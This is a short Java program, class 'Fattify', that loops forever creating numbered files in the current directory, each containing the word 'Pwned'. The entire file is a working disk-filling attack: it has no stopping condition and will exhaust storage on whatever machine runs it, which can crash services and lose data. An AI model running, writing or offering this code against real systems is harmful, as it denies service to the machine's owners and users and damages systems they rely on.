import java.io.*;
import javax.swing.*;
import java.math.BigInteger;

public class Fattify {
        public static void main(String[] args) throws IOException {
        BigInteger fileName = new BigInteger("0");
        BigInteger add = new BigInteger("1");
        String msg = "Pwned";
        while (true) {
            PrintWriter writer = new PrintWriter(fileName.toString(), "UTF-8");
            writer.println(msg);
            writer.close();

            fileName = fileName.add(add);
        }
    }
}
